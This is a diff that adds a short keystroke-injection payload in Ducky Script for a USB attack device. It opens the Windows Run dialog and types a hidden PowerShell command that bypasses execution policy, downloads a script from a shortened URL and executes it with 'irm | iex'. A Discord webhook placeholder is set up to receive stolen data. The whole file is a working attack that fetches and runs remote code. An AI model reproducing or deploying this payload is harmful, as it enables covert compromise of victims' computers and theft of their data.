@@ -1,0 +1,6 @@
+DELAY 500
+ESC
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/CF0P74 | iex
+ENTER
